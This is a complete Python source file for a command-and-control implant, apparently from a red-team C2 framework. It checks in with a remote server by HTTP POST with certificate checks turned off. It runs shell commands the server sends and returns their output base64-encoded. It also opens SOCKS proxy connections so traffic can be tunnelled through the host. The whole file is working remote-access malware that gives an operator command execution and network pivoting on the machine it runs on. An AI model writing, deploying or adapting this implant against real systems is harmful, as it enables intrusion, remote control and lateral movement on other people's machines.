import argparse
import base64
import json
import random
import requests
import subprocess
import sys
import socket
import select
import time
import urllib3
import traceback

from collections import namedtuple

AgentOption = namedtuple('AgentOption', ['name', 'description', 'parameters', 'type'])
Parameter = namedtuple('Parameter', ['name', 'description'])

routes = ['the', 'bird', 'is', 'a', 'nerd', 'd', 'juice']

proxies = []


def sleep():
    return 0
    # return random.randint(5, 10)


def base64_to_bytes(data) -> bytes:
    """
    Base64 encode a bytes object.
    :param data: A base64 string.
    :return: A bytes object.
    :rtype: bytes
    """
    return base64.b64decode(data)


def bytes_to_base64(data) -> str:
    """
    Base64 encode a bytes object.
    :param data: A python bytes object.
    :return: A base64 encoded string
    :rtype: str
    """
    return base64.b64encode(data).decode('utf-8')


def base64_to_string(data) -> str:
    """
    Base64 decode a string.
    :param data: A base64 string.
    :return: A base64 decoded string
    :rtype: str
    """
    return base64.b64decode(data.encode('utf-8')).decode('utf-8')


def string_to_base64(data) -> str:
    """
    Base64 encode a string.
    :param data: A python string.
    :return: A base64 encoded string
    :rtype: str
    """
    return str(base64.b64encode(data.encode()), 'utf-8')


def post(url, data, route=''):
    if not route:
        route = routes[random.randint(0, len(routes) - 1)]
    return requests.post(f'{url}{route}', data, verify=False).text


def main(url, key):
    batch_response = ''
    check_in_task_id = ''
    while True:
        try:
            if not check_in_task_id:
                data = key
            else:
                data = json.dumps(batch_response)
            batch_request = json.loads(post(url, data))
        except Exception as e:
            batch_response = [{
                "jsonrpc": "0.0.0",
                "error": {
                    "code": -32700,
                    "message": string_to_base64(str(e))
                },
                "id": check_in_task_id
            }]
            time.sleep(sleep())
            continue

        try:
            batch_response = []
            for task in batch_request:
                if task != 'check_in':
                    print(task)
                id = task['id']
                name = task['name']
                parameters = task['parameters']
                results = ''
                parameters = [base64_to_string(parameter) for parameter in parameters]
                try:
                    if name == 'check_in':
                        check_in_task_id = id
                        continue
                    if name == 'socks_disconnect':
                        try:
                            remote = proxies[int(parameters[0])]
                            remote.close()
                        except:
                            pass
                    if name == 'socks_connect':
                        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        atype = parameters[3]
                        socks_client_id = parameters[2]
                        rep = None
                        try:
                            remote.connect((parameters[0], int(parameters[1])))
                            rep = 0
                        except socket.error as e:
                            if e.errno == socket.errno.EACCES:
                                rep = 2
                            elif e.errno == socket.errno.ENETUNREACH:
                                rep = 3
                            elif e.errno == socket.errno.EHOSTUNREACH:
                                rep = 4
                            elif e.errno == socket.errno.ECONNREFUSED:
                                rep = 5
                            rep = rep if rep else 6
                            results = json.dumps(
                                {'remote': None, 'socks_client_id': f'{socks_client_id}', 'rep': f'{rep}',
                                 'atype': f'{atype}', 'bind_addr': None, 'bind_port': None})
                        finally:
                            bind_addr = remote.getsockname()[0]
                            bind_port = remote.getsockname()[1]

                            proxies.append(remote)
                            results = json.dumps(
                                {'remote': f'{proxies.index(remote)}', 'socks_client_id': f'{socks_client_id}',
                                 'rep': f'{rep}', 'atype': f'{atype}', 'bind_addr': f'{bind_addr}',
                                 'bind_port': f'{bind_port}'})
                    if name == 'socks_upstream':
                        print(parameters[0])
                        remote = proxies[int(parameters[0])]
                        upstream_data = base64_to_bytes(parameters[1])
                        remote.sendall(upstream_data)
                        results = 'sent successfully'
                    if name == 'socks_downstream':
                        remote = proxies[int(parameters[0])]
                        socks_client_id = parameters[1]
                        r, w, e = select.select([remote], [], [], 0)
                        downstream_data = b''
                        if r:
                            downstream_data += remote.recv(4096)
                            results = json.dumps(
                                {'remote': f'{proxies.index(remote)}', 'socks_client_id': f'{socks_client_id}',
                                 'downstream_data': f'{bytes_to_base64(downstream_data)}'})
                    if name == 'shell':
                        results = subprocess.run(parameters, capture_output=True, text=True).stdout
                    # if not results:
                    #     batch_response.extend([{
                    #         "connectrpc": "0.0.0",
                    #         "error": {
                    #             "code":-32601,
                    #             "message": string_to_base64(str(e))
                    #         },
                    #         "id": check_in_task_id
                    #     }])
                    batch_response.extend([{
                        "jsonrpc": "0.0.0",
                        "result": string_to_base64(results),
                        "id": id
                    }])

                except Exception as e:
                    batch_response.extend([{
                        "jsonrpc": "0.0.0",
                        "error": {
                            "code": -32600,
                            "message": string_to_base64(traceback.format_exc())
                        },
                        "id": check_in_task_id
                    }])
        except Exception as e:
            batch_response = [{
                "jsonrpc": "0.0.0",
                "error": {
                    "code": -32700,
                    "message": string_to_base64(traceback.format_exc())
                },
                "id": check_in_task_id
            }]
        batch_response.extend([{
            "jsonrpc": "0.0.0",
            "result": 'checking in',
            "id": check_in_task_id
        }])
        time.sleep(sleep())


if __name__ == '__main__':
    parser = argparse.ArgumentParser('Python Connect Implant', 'Python Connect Implant', conflict_handler='resolve')
    parser.add_argument('url', metavar='url', help='Server URL')
    parser.add_argument('key', metavar='key', help='Implant Key')
    args = parser.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    sys.exit(main(args.url, args.key))
